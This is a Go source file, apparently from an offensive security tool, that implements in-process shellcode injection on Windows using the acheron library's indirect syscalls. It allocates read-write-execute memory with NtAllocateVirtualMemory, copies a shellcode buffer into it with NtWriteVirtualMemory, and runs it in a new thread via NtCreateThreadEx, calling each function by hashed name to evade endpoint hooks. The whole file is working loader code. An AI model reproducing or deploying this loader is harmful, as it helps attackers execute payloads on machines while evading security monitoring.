//go:build windows && !direct

package inject

import (
	"fmt"
	"unsafe"

	"github.com/f1zm0/acheron"
	"golang.org/x/sys/windows"
)

func Inject(ach *acheron.Acheron, scBuf []byte) error {
	fmt.Printf("[!] Using indirect syscalls ...\n")

	fmt.Printf("[+] Allocating memory with NtAllocateVirtualMemory ...\n")
	scBufLen := len(scBuf)
	if _, err := ach.Syscall(
		ach.HashString("NtAllocateVirtualMemory"),
		hSelf,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(nil)),
		uintptr(unsafe.Pointer(&scBufLen)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	); err != nil {
		return err
	}

	fmt.Printf("[+] Writing shellcode to memory ...\n")
	if _, err := ach.Syscall(
		ach.HashString("NtWriteVirtualMemory"),
		hSelf,
		uintptr(unsafe.Pointer(baseAddr)),
		uintptr(unsafe.Pointer(&scBuf[0])),
		uintptr(scBufLen),
		0,
	); err != nil {
		return err
	}

	fmt.Printf("[+] Creating thread with NtCreateThreadEx ...\n")
	if _, err := ach.Syscall(
		ach.HashString("NtCreateThreadEx"),
		uintptr(unsafe.Pointer(&hThread)),
		windows.GENERIC_EXECUTE,
		0,
		hSelf,
		baseAddr,
		0,
		nullptr,
		0,
		0,
		0,
		0,
	); err != nil {
		return err
	}

	windows.WaitForSingleObject(
		windows.Handle(hThread),
		0xffffffff,
	)

	return nil
}
